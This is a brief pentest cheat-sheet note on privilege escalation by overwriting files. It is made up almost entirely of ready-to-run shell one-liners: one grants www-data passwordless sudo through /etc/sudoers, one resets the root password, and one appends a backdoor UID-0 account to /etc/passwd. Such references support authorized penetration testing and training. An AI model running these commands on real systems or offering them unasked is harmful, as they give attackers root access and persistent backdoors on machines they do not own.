---
id: Files
aliases: []
tags:
  - Pentest/Shells/Payloads/Files
---

# Files

## File Overwrite

Overwrite files to escalate privileges

Add `www-data` to `/etc/sudoers`

```sh
echo 'chmod 777 /etc/sudoers && echo "www-data ALL=NOPASSWD:ALL" >> /etc/sudoers && chmod 440 /etc/sudoers' > /tmp/update
```

Change `root` password

```sh
echo "root:hacked" | chpasswd
```

Add new root user to `/etc/passwd`

```sh
echo hacker:$((mkpasswd -m SHA-512 myhackerpass || openssl passwd -1 -salt mysalt myhackerpass || echo '$1$mysalt$7DTZJIc9s6z60L6aj0Sui.') 2>/dev/null):0:0::/:/bin/bash >> /etc/passwd
```
